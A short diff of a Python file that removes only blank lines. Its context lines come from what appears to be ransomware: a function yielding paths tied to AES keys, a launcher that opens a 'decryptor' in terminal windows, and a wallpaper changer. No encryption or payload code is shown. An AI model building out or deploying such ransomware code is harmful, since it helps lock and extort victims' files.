@@ -53,7 +53,6 @@ def get_paths():
     
     for aes_and_path in content:
         yield aes_and_path[1]
-    
 
 
 def open_decryptor():
@@ -66,8 +65,6 @@ def open_decryptor():
     os.system(gnome)
     xfce = 'xfce4-terminal --command=./decryptor'
     os.system(xfce)
-
-    
 
 
 def change_wallpaper():
